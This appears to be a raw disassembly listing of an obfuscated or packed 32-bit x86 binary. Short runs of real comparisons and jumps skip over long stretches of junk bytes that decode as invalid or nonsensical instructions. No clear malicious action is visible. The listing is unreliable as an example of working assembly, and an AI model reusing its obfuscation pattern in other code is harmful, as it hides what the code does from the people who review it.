  42a66b:	jmp    0x42a74b
  42a670:	pop    eax
  42a671:	lds    ebx,FWORD PTR [edi]
  42a673:	xor    al,0x9f
  42a675:	(bad)  
  42a676:	jnp    0x42a665
  42a678:	dec    esi
  42a679:	int3   
  42a67a:	mov    esp,0x4076ffda
  42a67f:	int    0x4f
  42a681:	test   BYTE PTR [ecx],0x0
  42a684:	ret    
  42a685:	add    BYTE PTR [eax],al
  42a687:	add    BYTE PTR [ecx],al
  42a689:	xchg   DWORD PTR [esp+esi*8+0x5f64a579],ebx
  42a690:	or     BYTE PTR [edi-0x79],dh
  42a693:	aad    0xde
  42a695:	call   0xba810ba9
  42a69a:	mov    ebx,esi
  42a69c:	pop    esi
  42a69d:	or     BYTE PTR [eax+0x14],cl
  42a6a0:	repz cmc 
  42a6a2:	in     eax,dx
  42a6a3:	or     esp,DWORD PTR [edi-0x537e132d]
  42a6a9:	push   edi
  42a6aa:	(bad)  
  42a6ab:	mul    DWORD PTR [ecx+0x42]
  42a6ae:	push   esi
  42a6af:	neg    DWORD PTR [eax+0xf]
  42a6b2:	mov    ebp,?
  42a6b4:	in     eax,0xc1
  42a6b6:	out    dx,eax
  42a6b7:	xor    al,ch
  42a6b9:	std    
  42a6ba:	mov    ebx,0xb32ae7ec
  42a6bf:	ficom  WORD PTR [esi]
  42a6c1:	pushf  
  42a6c2:	jne    0x42a654
  42a6c4:	xor    al,0x6
  42a6c6:	sbb    al,0x9
  42a6c8:	jmp    0xbc0e:0xf95de0b
  42a6cf:	xchg   BYTE PTR [ebx+0x7e0e62c6],ah
  42a6d5:	xchg   BYTE PTR [ebx-0x321780ee],ch
  42a6db:	dec    esp
  42a6dd:	fnstenv [eax+0x16e241e4]
  42a6e3:	push   ebp
  42a6e4:	pushf  
  42a6e5:	aaa    
  42a6e6:	cs xor dl,al
  42a6e9:	push   0x87114a76
  42a6ee:	addr16 call 0xf8c:0x173baea4
  42a6f6:	imul   eax,DWORD PTR [eax-0x4a7aa6af],0xffffffd8
  42a6fd:	out    0xe1,al
  42a6ff:	leave  
  42a700:	xor    cl,BYTE PTR [esi]
  42a702:	in     al,dx
  42a703:	inc    ecx
  42a704:	shl    DWORD PTR [edi],cl
  42a706:	sbb    BYTE PTR [edx-0x50184e25],cl
  42a70c:	adc    edi,DWORD PTR [eax]
  42a70e:	iret   
  42a70f:	lea    ebp,[eax]
  42a711:	or     cl,dl
  42a713:	rcr    DWORD PTR [ebx-0x5f3aadc3],0xbd
  42a71a:	imul   eax,DWORD PTR [eax-0x5864598a],0x5
  42a721:	jge    0x42a6bd
  42a723:	imul   bl
  42a725:	in     al,0xf8
  42a727:	sub    ebx,ebx
  42a729:	loope  0x42a773
  42a72b:	inc    edx
  42a72c:	dec    ebx
  42a72d:	fucomip st,st(5)
  42a730:	dec    ecx
  42a731:	jb     0x42a744
  42a733:	pop    edx
  42a734:	cmp    ah,BYTE PTR [edi+0x27]
  42a737:	inc    edi
  42a738:	cli    
  42a739:	out    0x4c,eax
  42a73b:	mov    ebx,0x7fda9307
  42a740:	aad    0x2d
  42a742:	(bad)  
  42a743:	popf   
  42a744:	loopne 0x42a782
  42a746:	fs and ch,ch
  42a749:	je     0x42a726
  42a74b:	cmp    eax,0xebeb4fd4
  42a750:	jne    0x42a842
  42a756:	jmp    0x42a836
  42a75b:	sti    
  42a75c:	mov    edi,0xbbc58b85
  42a761:	(bad)  
  42a762:	(bad)  
  42a763:	mov    esi,0x37381cf8
  42a768:	xchg   BYTE PTR [edx+0x1f712cd],bl
  42a76e:	add    bl,al
  42a770:	add    BYTE PTR [eax],al
  42a772:	add    BYTE PTR [edi+0x28fe2300],dl
  42a778:	(bad)  
  42a779:	loopne 0x42a769
  42a77b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a77c:	mov    bh,0x98
  42a77e:	scas   al,BYTE PTR es:[edi]
  42a77f:	sub    al,0x5a
  42a781:	jle    0x42a7e7
  42a783:	sahf   
  42a784:	test   DWORD PTR [ebp+0x11],ecx
  42a787:	aaa    
  42a788:	sub    bl,ah
  42a78a:	xchg   DWORD PTR [ebx-0x3dfe7c3e],esi
  42a790:	and    DWORD PTR [edi],0xb
  42a793:	int3   
  42a794:	pusha  
  42a795:	sbb    bh,BYTE PTR [edx-0x441b1031]
  42a79b:	js     0x42a73e
  42a79d:	out    0x3d,al
  42a79f:	lea    ebp,[ebx+ebx*1+0xf735fd5]
  42a7a6:	pop    ecx
  42a7a7:	push   DWORD PTR [ebp-0x71468155]
  42a7ad:	xor    al,0x33
  42a7af:	out    dx,al
  42a7b0:	push   ss
  42a7b1:	(bad)  
  42a7b2:	xchg   esp,eax
  42a7b3:	xchg   esi,eax
  42a7b4:	int    0xda
  42a7b6:	cmp    ah,dh
  42a7b8:	sub    dh,BYTE PTR [esi-0x26f8b751]
  42a7be:	and    al,0x7a
  42a7c0:	adc    eax,0x726c9ad2
  42a7c5:	cdq    
  42a7c6:	mov    eax,0xaab864fe
  42a7cb:	in     eax,0x59
  42a7cd:	pop    edi
  42a7ce:	dec    edi
  42a7cf:	push   ss
  42a7d0:	or     DWORD PTR [esi+0x3c],0x2e
  42a7d4:	jo     0x42a806
  42a7d6:	test   BYTE PTR [edx-0x467eaf9b],ch
  42a7dc:	mov    esi,0x34f9f65e
  42a7e1:	jle    0x42a833
  42a7e3:	xchg   DWORD PTR [edi+0x15d1d438],ecx
  42a7e9:	cmc    
  42a7ea:	pop    esi
  42a7eb:	xor    al,0x79
  42a7ed:	cdq    
  42a7ee:	or     DWORD PTR [edi+0x17057a46],esi
  42a7f4:	loope  0x42a83b
  42a7f6:	mov    bl,0xec
  42a7f8:	out    dx,eax
  42a7f9:	push   ecx
  42a7fa:	leave  
  42a7fb:	push   esi
  42a7fc:	data16 xor al,0x4f
  42a7ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a800:	daa    
  42a801:	inc    edx
  42a802:	mov    WORD PTR [ecx+edx*4-0x37],ds
  42a806:	mov    al,ds:0x3757a65
  42a80b:	mov    dh,BYTE PTR [ecx]
  42a80d:	fs mov esp,0x650deea
  42a813:	cdq    
  42a814:	cmp    esi,ebx
  42a816:	mov    cl,0xca
  42a818:	loopne 0x42a823
  42a81a:	pop    ds
  42a81b:	jno    0x42a7eb
  42a81d:	mov    esp,0x5a13426a
  42a822:	xlat   BYTE PTR ds:[ebx]
  42a823:	nop
  42a824:	mov    ah,0x43
  42a826:	lea    ebx,[ecx]
  42a828:	leave  
  42a829:	(bad)  
  42a82a:	(bad)  
  42a82b:	popa   
  42a82c:	push   ds
  42a82d:	lods   al,BYTE PTR ds:[esi]
  42a82e:	xor    DWORD PTR [eax+ebp*4+0x481610ef],edi
  42a835:	jle    0x42a7b8
  42a837:	cli    
  42a838:	(bad)  
  42a83a:	(bad)  
  42a83b:	dec    DWORD PTR [edi]
  42a83d:	test   BYTE PTR [edi+0x5],dh
  42a840:	add    BYTE PTR [eax],al
  42a842:	mov    eax,DWORD PTR [esp+0x70]
  42a846:	cdq    
  42a847:	jmp    0x42a927
  42a84c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a84d:	push   ebp
  42a84e:	pop    es
  42a84f:	mov    ds:0x55a7f3f7,eax
  42a854:	push   es
  42a855:	pop    esi
  42a856:	adc    al,0x67
  42a858:	(bad)  
  42a859:	mov    esp,0xf7d53fb3
  42a85e:	add    DWORD PTR [eax],eax
  42a860:	ret    
  42a861:	add    BYTE PTR [eax],al
  42a863:	add    dh,ch
  42a865:	jge    0x42a88d
  42a867:	fwait
  42a868:	xor    eax,0xd5b3e196
  42a86d:	dec    edi
  42a86e:	fbstp  TBYTE PTR [edx]
  42a870:	lea    edx,[esi]
  42a872:	jae    0x42a8e2
  42a874:	js     0x42a86c
  42a876:	xor    ecx,DWORD PTR [edi-0xf]
  42a879:	ret    
  42a87a:	jmp    0xa796c591
  42a87f:	inc    ebx
  42a880:	dec    edi
  42a881:	xchg   ecx,eax
  42a882:	jns    0x42a850
  42a884:	mov    edx,0xedf5ae18
  42a889:	mov    cl,0xb9
  42a88b:	cs push ecx
  42a88d:	fcmovb st,st(0)
  42a88f:	dec    ebx
  42a890:	(bad)  
  42a891:	cdq    
  42a892:	mov    al,0xf1
  42a894:	(bad)  
  42a896:	test   eax,0x2e47475c
  42a89b:	sub    BYTE PTR [ecx+0x24c59b1c],dh
  42a8a1:	xchg   BYTE PTR [esi],ch
  42a8a3:	aaa    
  42a8a4:	sub    eax,0x325cff85
  42a8a9:	sbb    BYTE PTR [ebx-0x156a15a1],bl
  42a8af:	imul   ecx,DWORD PTR [ebp+0x72],0x23ee29f7
  42a8b6:	jl     0x42a8d4
  42a8b8:	clc    
  42a8b9:	and    bl,BYTE PTR [edi+eax*1+0x4e9d6f4a]
  42a8c0:	jg     0x42a854
  42a8c2:	fstp   DWORD PTR [esp+edi*4]
  42a8c5:	xchg   esi,eax
  42a8c6:	inc    esi
  42a8c7:	cmp    eax,0x93597ced
  42a8cc:	sub    eax,0x2a41f32b
  42a8d1:	xchg   ecx,eax
  42a8d2:	xchg   edx,eax
  42a8d3:	mov    WORD PTR [ebp+0x2b7666b8],gs
  42a8d9:	aas    
  42a8da:	dec    edx
  42a8db:	clc    
  42a8dc:	jp     0x42a8df
  42a8de:	push   ecx
  42a8df:	lock sub BYTE PTR [ecx-0x68],bl
  42a8e3:	mov    ebx,0x910a7fbd
  42a8e8:	jnp    0x42a8f3
  42a8ea:	and    eax,0x447eec30
  42a8ef:	daa    
  42a8f0:	cmp    BYTE PTR [edx-0x4b],ah
  42a8f3:	inc    ebx
  42a8f4:	xchg   esp,eax
  42a8f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a8f6:	into   
  42a8f7:	cdq    
  42a8f8:	sbb    eax,0x1ba1605d
  42a8fd:	or     dh,BYTE PTR [ebp-0x2be278fb]
  42a903:	pop    ecx
  42a904:	jns    0x42a8ea
  42a906:	and    dl,BYTE PTR [eax-0x18]
  42a909:	sti    
  42a90a:	scas   eax,DWORD PTR es:[edi]
  42a90b:	inc    esi
  42a90c:	push   edx
  42a90d:	loopne 0x42a89b
  42a90f:	mov    ebp,edi
  42a911:	lods   al,BYTE PTR ds:[esi]
  42a912:	clc    
  42a913:	and    bl,BYTE PTR [edx+0xe]
  42a916:	shr    BYTE PTR ds:0xdfbd890a,0x24
  42a91d:	sub    BYTE PTR [esi],dl
  42a91f:	jae    0x42a967
  42a921:	fdivp  st(0),st
  42a923:	mov    eax,0x36b1ac6
  42a928:	(bad)  
  42a929:	adc    edx,ecx
  42a92b:	xor    edx,ebx
  42a92d:	jmp    0x42aa0d
  42a932:	dec    ebp
  42a933:	and    al,0x9d
  42a935:	dec    ecx
  42a936:	std    
  42a937:	stc    
  42a938:	frstor [ebx+esi*8]
  42a93b:	hlt    
  42a93c:	sub    edi,DWORD PTR [edi]
  42a93e:	aaa    
  42a93f:	pop    esp
  42a940:	sar    BYTE PTR [eax+ebx*4-0x3cfffe08],1
  42a947:	add    BYTE PTR [eax],al
  42a949:	add    dl,ch
  42a94b:	add    BYTE PTR [ebx+esi*4],0x75
  42a94f:	jg     0x42a91d
  42a951:	mul    ch
  42a953:	test   BYTE PTR [edx-0x40],dl
  42a956:	int    0xe2
  42a958:	das    
  42a959:	pop    edx
  42a95a:	add    DWORD PTR [ebx-0x14],ebx
  42a95d:	stc    
  42a95e:	ins    BYTE PTR es:[edi],dx
  42a95f:	and    eax,0x2de308bb
  42a964:	mov    DWORD PTR [ebx+0x67fe7298],ecx
  42a96a:	xor    eax,0x1fd138ef
  42a96f:	idiv   DWORD PTR [eax+0x51ba8a88]
  42a975:	push   ebx
  42a976:	ror    ebx,cl
  42a978:	push   ecx
  42a979:	jl     0x42a94e
  42a97b:	mov    cl,0x73
  42a97d:	sbb    eax,0xad9d1cba
  42a982:	xor    edx,esi
  42a984:	icebp  
  42a985:	mov    ds:0x76942060,eax
  42a98a:	push   ss
  42a98b:	and    dl,BYTE PTR [ebx+esi*1+0x16]
  42a98f:	rol    ebp,cl
  42a991:	push   edx
  42a992:	hlt    
  42a993:	mov    bl,0x36
  42a995:	aaa    
  42a996:	in     eax,dx
  42a997:	jmp    0xeb5b:0x4fa6e64b
  42a99e:	pavgb  mm6,QWORD PTR [ebp+0x5c3a90b3]
  42a9a5:	jae    0x42a9d1
  42a9a7:	test   al,0x60
  42a9a9:	lea    edi,[esi]
  42a9ab:	test   eax,edx
  42a9ad:	inc    ecx
  42a9ae:	fisub  DWORD PTR [edx-0x6d]
  42a9b1:	dec    eax
  42a9b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a9b3:	fiadd  WORD PTR [esi+0x44]
  42a9b6:	leave  
  42a9b7:	mov    BYTE PTR ds:0xc092aa27,0xb2
  42a9be:	(bad)  
  42a9bf:	push   ds
  42a9c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a9c1:	(bad)  [ecx+0x526a3e25]
  42a9c7:	mov    al,BYTE PTR [eax-0x2]
  42a9ca:	push   0xffffff93
  42a9cc:	pop    ebp
  42a9cd:	ja     0x42aa3f
  42a9cf:	sub    eax,DWORD PTR [ebx-0x4f98f99d]
  42a9d5:	sub    bl,BYTE PTR cs:[esi+0x55de8c4b]
  42a9dc:	inc    edx
  42a9dd:	add    esp,edx
  42a9df:	pop    edi
  42a9e0:	xchg   edi,eax
  42a9e1:	adc    DWORD PTR [esi-0x7f663fc5],esi
  42a9e7:	push   ss
  42a9e8:	pop    edi
  42a9e9:	imul   ebp,DWORD PTR [ebp*2-0x6fa8256c],0x65a3c166
  42a9f4:	xchg   ebx,eax
  42a9f5:	xor    al,0x83
  42a9f7:	jmp    0x42a9ce
  42a9f9:	test   eax,0xa18b715
  42a9fe:	dec    ebp
  42a9ff:	mov    esi,0x677faa5f
  42aa04:	retf   0x2cb
  42aa07:	inc    ecx
  42aa08:	not    dl
  42aa0a:	and    BYTE PTR [eax+0x24548930],bh
  42aa10:	and    al,0x8b
  42aa12:	push   esp
  42aa13:	and    al,0x10
  42aa15:	mov    DWORD PTR [esp+0x18],edx
  42aa19:	jmp    0x42aaf9
  42aa1e:	pop    ds
  42aa1f:	xor    DWORD PTR [edx+edx*4-0x42e04052],ecx
  42aa26:	push   cs
  42aa27:	fdivr  st,st(3)
  42aa29:	xor    edi,DWORD PTR [edx+ebx*8]
  42aa2c:	and    BYTE PTR [ecx+0x1f95b],0xc3
  42aa33:	add    BYTE PTR [eax],al
  42aa35:	add    BYTE PTR [eax-0x27],ah
  42aa38:	add    al,0x8e
  42aa3a:	xchg   ebp,eax
  42aa3b:	add    DWORD PTR [ebx],ebx
  42aa3d:	sub    ah,ah
  42aa3f:	rol    DWORD PTR [esi+0x3f9d9fa5],cl
  42aa45:	fcom   DWORD PTR [ebx-0x8]
  42aa48:	(bad)
  42aa4c:	adc    BYTE PTR [eax-0x15a9d95e],ch
  42aa52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa53:	fnsave [esi-0x14ee1aa4]
  42aa59:	inc    ebx
  42aa5a:	pop    ecx
  42aa5b:	pushf  
  42aa5c:	pop    esp
  42aa5d:	mov    ecx,ecx
  42aa5f:	mov    bh,BYTE PTR [ebx+ebx*4]
  42aa62:	(bad)  
  42aa63:	mov    ds:0x38bd8436,al
  42aa68:	in     al,dx
  42aa69:	ja     0x42aad9
  42aa6b:	dec    ebp
  42aa6c:	and    ah,BYTE PTR [ecx*4-0x22ee2e3d]
  42aa73:	mov    eax,ds:0x4a94f0aa
  42aa78:	nop
  42aa79:	inc    eax
  42aa7a:	mov    esi,0x7288e975
  42aa7f:	popf   
  42aa80:	sub    ecx,DWORD PTR ss:[eax-0x7ec72fe8]
  42aa87:	or     eax,DWORD PTR [eax]
  42aa89:	cmp    DWORD PTR [ecx+0x20790832],eax
  42aa8f:	rcr    BYTE PTR [edi+0x58],cl
  42aa92:	push   edx
  42aa93:	outs   dx,DWORD PTR ds:[esi]
  42aa94:	inc    ebp
  42aa95:	loope  0x42aa31
  42aa97:	loopne 0x42aab3
  42aa99:	xchg   edi,eax
  42aa9a:	adc    eax,ebp
  42aa9c:	nop
  42aa9d:	mov    eax,0xb933ad78
  42aaa2:	push   ss
  42aaa3:	in     eax,0x8
  42aaa5:	scas   al,BYTE PTR es:[edi]
  42aaa6:	arpl   WORD PTR [ebp+ebp*8+0x15],sp
  42aaaa:	inc    ebp
  42aaab:	mov    esp,0x78ebe72c
  42aab0:	repnz lock scas al,BYTE PTR es:[edi]
  42aab3:	out    0xb8,al
  42aab5:	mov    bl,0x91
  42aab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aab8:	dec    ecx
  42aab9:	dec    ecx
  42aaba:	retf   
  42aabb:	xor    BYTE PTR [eax+edi*4],ah
  42aabe:	and    eax,0x35f5b008
  42aac3:	and    al,0x9a
  42aac5:	jnp    0x42ab26
  42aac7:	push   edx
  42aac8:	push   edx
  42aac9:	inc    ebx
  42aaca:	stos   BYTE PTR es:[edi],al
  42aacb:	icebp  
  42aacc:	add    esp,DWORD PTR [eax+0x2994b359]
  42aad2:	and    DWORD PTR [ebx-0x27654da5],esi
  42aad8:	inc    esp
  42aad9:	fmul   st(2),st
  42aadb:	sub    BYTE PTR [edi-0x5a0a8e31],cl
  42aae1:	and    DWORD PTR [edi-0x2346cb52],ecx
  42aae7:	dec    esi
  42aae8:	add    DWORD PTR ds:[edi+0x71d01f41],0x7740fa40
  42aaf3:	mov    esp,0xc9d341a
  42aaf8:	mov    dl,0x8b
  42aafa:	push   esp
  42aafb:	and    al,0x14
  42aafd:	jmp    0x42abdd
  42ab02:	push   esi
  42ab03:	sbb    eax,0xff6ba362
  42ab08:	xlat   BYTE PTR ds:[ebx]
  42ab09:	std    
  42ab0a:	jmp    0xf68e:0x82deb497
  42ab11:	dec    esi
  42ab12:	push   ds
  42ab13:	cli    
  42ab14:	add    DWORD PTR [eax],eax
  42ab16:	ret    
  42ab17:	add    BYTE PTR [eax],al
  42ab19:	add    bl,al
  42ab1b:	push   eax
  42ab1c:	jne    0x42ab87
  42ab1e:	xchg   esi,eax
  42ab1f:	push   ds
  42ab20:	inc    ecx
  42ab21:	shl    dh,cl
  42ab23:	sar    BYTE PTR [edx+0x755c5e71],0xbb
  42ab2a:	inc    esp
  42ab2b:	adc    esi,DWORD PTR [esi+ebp*1-0x3f7b96a4]
  42ab32:	retf   
  42ab33:	sub    eax,0x2a087a4e
  42ab38:	mov    ebx,0x75524666
  42ab3d:	les    edi,FWORD PTR [edx]
  42ab3f:	or     ebx,DWORD PTR [edx+0x470ea0b0]
  42ab45:	push   es
  42ab46:	sbb    al,0xd5
  42ab48:	sub    DWORD PTR [eax+eax*4-0x3c4085f1],ecx
  42ab4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ab50:	inc    esp
  42ab51:	inc    ebx
  42ab52:	ds add eax,0x1fbf7b97
  42ab58:	(bad)  
  42ab59:	retf   0x404d
  42ab5c:	bound  edi,QWORD PTR [eax+0x43d29dc7]
  42ab62:	lahf   
  42ab63:	ror    ebp,1
  42ab65:	mov    dl,0xe4
  42ab67:	das    
  42ab68:	dec    edi
  42ab69:	sahf   
  42ab6a:	dec    esi
  42ab6b:	cmp    eax,0xfd7551
  42ab70:	mov    esp,DWORD PTR [esi]
  42ab72:	fisttp WORD PTR [esi+0x3e]
  42ab75:	dec    esp
  42ab76:	arpl   WORD PTR [edi+eiz*1+0x3a],di
  42ab7a:	out    0xd2,al
  42ab7c:	mov    esp,0xb0b28e33
  42ab81:	and    ah,BYTE PTR [eax-0x66161ce1]
  42ab87:	push   edi
  42ab88:	sub    esi,DWORD PTR [ecx]
  42ab8a:	retf   0x1c42
  42ab8d:	gs ds dec edx
  42ab90:	xlat   BYTE PTR ds:[ebx]
  42ab91:	ins    BYTE PTR es:[edi],dx
  42ab92:	(bad)  
  42ab94:	ja     0x42ab4a
  42ab96:	fldenv [ebp+0xa]
  42ab99:	stos   BYTE PTR es:[edi],al
  42ab9a:	ret    0xcc3c
  42ab9d:	sbb    DWORD PTR [ecx-0x244e43c2],eax
  42aba3:	pop    eax
  42aba4:	xchg   DWORD PTR [ebp-0x7],eax
  42aba7:	cmp    dl,dl
  42aba9:	ss loop 0x42abad
  42abac:	(bad)  
  42abad:	in     eax,dx
  42abae:	addr16 ror ebx,0x1f
  42abb2:	test   DWORD PTR [eax],0xfe42103
  42abb8:	mov    ch,0xd6
  42abba:	es mov eax,0x8202a732
  42abc0:	mov    edx,0x56982b71
  42abc5:	out    dx,al
  42abc6:	push   es
  42abc7:	cmp    BYTE PTR [edi+ebp*8-0x31620986],0x90
  42abcf:	jo     0x42ac01
  42abd1:	ror    edx,cl
  42abd3:	sub    al,0x93
  42abd5:	in     eax,0xf7
  42abd7:	mov    ah,0xbf
  42abd9:	(bad)  
  42abda:	popa   
  42abdb:	fmulp  st(2),st
  42abdd:	xor    eax,esi
  42abdf:	mov    DWORD PTR [esp+0x1c],edx
  42abe3:	jmp    0x42acc3
  42abe8:	arpl   WORD PTR [edi+0x33],sp
  42abeb:	sbb    eax,0x7f6f5d37
  42abf0:	jecxz  0x42ac5b
  42abf2:	xor    eax,0xed6b9dde
  42abf7:	(bad)  
  42abf8:	loope  0x42abf4
  42abfa:	add    DWORD PTR [eax],eax
  42abfc:	ret    
  42abfd:	add    BYTE PTR [eax],al
  42abff:	add    BYTE PTR [edi],bh
  42ac01:	in     eax,0x60
  42ac03:	mov    edi,0x90875f54
  42ac08:	adc    cl,0x96
  42ac0b:	nop
  42ac0c:	(bad)  
  42ac0d:	and    eax,0x865dc0b7
  42ac12:	pusha  
  42ac13:	lods   al,BYTE PTR ds:[esi]
  42ac14:	mov    edi,0x5e679fed
  42ac19:	sahf   
  42ac1a:	inc    eax
  42ac1b:	sbb    BYTE PTR [edi+0x55975751],bl
  42ac21:	cmp    DWORD PTR [edx+0x2d],ebx
  42ac24:	push   esi
  42ac25:	push   edx
  42ac26:	fnstsw WORD PTR [ecx+0x16]
  42ac29:	cmp    BYTE PTR [ebx+0x6865ae05],0x1f
  42ac30:	sub    DWORD PTR [eax-0x1cdfa070],esp
  42ac36:	add    al,cl
  42ac38:	push   eax
  42ac39:	jb     0x42aca0
  42ac3b:	xor    BYTE PTR [esi-0x5cd62234],ah
  42ac41:	repnz sahf 
  42ac43:	stos   BYTE PTR es:[edi],al
  42ac44:	(bad)  
  42ac48:	pop    ss
  42ac49:	ins    DWORD PTR es:[edi],dx
  42ac4a:	mov    edx,ebx
  42ac4c:	sbb    DWORD PTR ss:[edx-0x273c6010],edx
  42ac53:	cmp    DWORD PTR [edx+ebp*2-0x4791451b],eax
  42ac5a:	fisub  WORD PTR [ebx-0x34]
  42ac5d:	inc    edx
  42ac5e:	push   esi
  42ac5f:	adc    dh,BYTE PTR [ecx]
  42ac61:	test   al,0xa4
  42ac63:	xchg   BYTE PTR [edx+esi*2+0x3e613211],cl
  42ac6a:	test   BYTE PTR [edx],0x21
  42ac6d:	es popa 
  42ac6f:	ret    0x9005
  42ac72:	add    esi,ebp
  42ac74:	mov    ecx,0x3cfd0a2a
  42ac79:	push   ebp
  42ac7a:	add    al,BYTE PTR [edi]
  42ac7c:	test   ah,cl
  42ac7e:	xchg   edx,eax
  42ac7f:	push   ss
  42ac80:	mov    ds:0x77d657c9,al
  42ac85:	fiadd  WORD PTR [ecx]
  42ac87:	fs xchg ecx,eax
  42ac89:	fcmovnb st,st(5)
  42ac8b:	mov    esi,0xf3cc09d7
  42ac90:	mov    eax,ds:0x309dc96d
  42ac95:	je     0x42ac96
  42ac97:	push   ebp
  42ac98:	jno    0x42acd7
  42ac9a:	imul   DWORD PTR [ebp-0x3eee05f2]
  42aca0:	and    eax,0x4f7cdd8c
  42aca5:	fs jmp 0x42ad04
  42aca8:	adc    BYTE PTR [ebx+ecx*8],0x4c
  42acac:	sti    
  42acad:	jb     0x42ac99
  42acaf:	push   cs
  42acb0:	enter  0x7799,0x40
  42acb4:	and    eax,0x978c84fc
  42acb9:	or     eax,0x96e6226f
  42acbe:	sub    BYTE PTR [edi+0x23],0xf6
  42acc2:	in     al,dx
  42acc3:	cmp    DWORD PTR [esp+0x18],eax
  42acc7:	jne    0x42cb72
  42accd:	mov    eax,DWORD PTR [esp+0x24]
  42acd1:	jmp    0x42adb1
  42acd6:	jg     0x42ad32
  42acd8:	and    DWORD PTR [edi+0x25],esp
  42acdb:	jg     0x42ad5c
  42acdd:	pop    edx
  42acde:	stc    
  42acdf:	div    BYTE PTR [eax-0x22]
  42ace2:	pop    esp
  42ace3:	lds    edi,FWORD PTR [ebx]
  42ace5:	ret    
  42ace6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ace7:	sti    
  42ace8:	add    DWORD PTR [eax],eax
  42acea:	ret    
  42aceb:	add    BYTE PTR [eax],al
  42aced:	add    BYTE PTR [esi],dl
  42acef:	in     eax,0x4b
  42acf1:	and    edx,DWORD PTR [esi]
  42acf3:	gs pop ss
  42acf5:	mov    ds:0xd71e38c4,eax
  42acfa:	jg     0x42ad67
  42acfc:	inc    ebx
  42acfd:	xchg   ebp,eax
  42acfe:	xchg   esp,eax
  42acff:	out    0x9a,eax
  42ad01:	fcmovnbe st,st(0)
  42ad03:	pop    eax
  42ad04:	jmp    0x42ad5d
  42ad06:	fs and eax,0x401a0e91
  42ad0c:	add    ah,ch
  42ad0e:	mov    ds:0x9459bcfb,eax
  42ad13:	cdq    
  42ad14:	mov    esi,0xea423bcc
  42ad19:	daa    
  42ad1a:	out    dx,al
  42ad1b:	xchg   esi,eax
  42ad1c:	sbb    DWORD PTR [ebp-0x37b710c1],eax
  42ad22:	shr    BYTE PTR [edi+0x4efb4897],cl
  42ad28:	sbb    ecx,eax
  42ad2a:	pop    es
  42ad2b:	xchg   esi,eax
  42ad2c:	(bad)  
  42ad2e:	mov    eax,ds:0x1b4bb025
  42ad33:	int3   
  42ad34:	jmp    0xd58c:0x935d1d60
  42ad3b:	xchg   bh,al
  42ad3d:	bts    eax,ebp
  42ad40:	fwait
  42ad41:	iret   
  42ad42:	sub    esp,DWORD PTR ds:0x7200d875
  42ad48:	push   cs
  42ad49:	pop    ss
  42ad4a:	mov    bh,0xd5
  42ad4c:	inc    esi
  42ad4d:	mov    BYTE PTR [esi+ebx*4-0x57851b20],ch
  42ad54:	stos   BYTE PTR es:[edi],al
  42ad55:	mov    al,ds:0x24351822
  42ad5a:	or     cl,BYTE PTR [ebp+0x10]
  42ad5d:	gs test al,0xab
  42ad60:	inc    ecx
  42ad61:	pop    esi
  42ad62:	jo     0x42ad68
  42ad64:	loop   0x42ad96
  42ad66:	outs   dx,DWORD PTR ds:[esi]
  42ad67:	std    
  42ad68:	pop    ds
  42ad69:	jb     0x42ad6e
  42ad6b:	ror    DWORD PTR [esi-0x1b45e30b],cl
  42ad71:	mov    eax,ds:0x8fe737e2
  42ad76:	dec    eax
  42ad77:	pop    edi
  42ad78:	adc    DWORD PTR [ebp+0x31],ebp
  42ad7b:	rol    DWORD PTR [eax-0x42],cl
  42ad7e:	adc    edx,DWORD PTR [ecx+0x42]
  42ad81:	into   
  42ad82:	or     al,0xa1
  42ad84:	adc    edi,DWORD PTR [edi-0x7e]
  42ad87:	fnstenv [esi+0x1f6a7355]
  42ad8d:	scas   eax,DWORD PTR es:[edi]
  42ad8e:	sahf   
  42ad8f:	pop    esi
  42ad90:	xlat   BYTE PTR ds:[ebx]
  42ad91:	mov    cl,0xdd
  42ad93:	(bad)  
  42ad94:	in     al,0xfe
  42ad96:	rcr    ebp,cl
  42ad98:	jo     0x42ae04
  42ad9a:	pop    eax
  42ad9b:	inc    edi
  42ad9c:	xchg   ecx,ecx
  42ad9e:	or     al,0xc9
  42ada0:	shl    BYTE PTR [esi+0x4a],1
  42ada3:	stc    
  42ada4:	call   0x2dc1:0x30ea6fc2
  42adab:	cmp    eax,0x5ed0bafe
  42adb0:	xchg   edx,eax
  42adb1:	cmp    edx,eax
  42adb3:	jne    0x42cb72
  42adb9:	mov    DWORD PTR [esp+0x54],0x433240
  42adc1:	mov    DWORD PTR [esp+0x48],0x433238
  42adc9:	mov    eax,DWORD PTR [esp+0x84]
  42add0:	xor    edx,edx
  42add2:	add    eax,edi
  42add4:	adc    ecx,edx
  42add6:	mov    edx,DWORD PTR [esp+0x10]
  42adda:	mov    DWORD PTR [esp+0x18],edx
  42adde:	mov    edx,DWORD PTR [esp+0x14]
  42ade2:	xor    eax,esi
  42ade4:	jmp    0x42aec4
  42ade9:	add    al,cl
  42adeb:	push   ds
  42adec:	dec    ecx
  42aded:	(bad)  
  42adef:	push   edi
  42adf0:	retf   
  42adf1:	mov    edi,0x3fdee75b
  42adf6:	cwde   
  42adf7:	or     BYTE PTR [ebx+0x1fc67],bh
  42adfd:	ret    
  42adfe:	add    BYTE PTR [eax],al
  42ae00:	add    BYTE PTR [ecx+0x2b7b19f6],cl
  42ae06:	cmp    DWORD PTR [edx+edx*4],edi
  42ae09:	pop    esp
  42ae0a:	push   0xa0c4f08a
  42ae0f:	pop    ds
  42ae10:	push   ss
  42ae11:	xor    al,0x25
  42ae13:	mov    esi,0x3adcb714
  42ae18:	imul   edx,DWORD PTR [eax+eax*4-0x1aa0a5d6],0xedaf976
  42ae23:	xchg   edx,eax
  42ae24:	inc    esp
  42ae25:	mov    dh,0xa5
  42ae27:	gs iret 
  42ae29:	pop    ebp
  42ae2a:	pushf  
  42ae2b:	add    al,0xb9
  42ae2d:	xor    eax,DWORD PTR [ecx-0x7f]
  42ae30:	clc    
  42ae31:	sbb    DWORD PTR [eax-0x72],esi
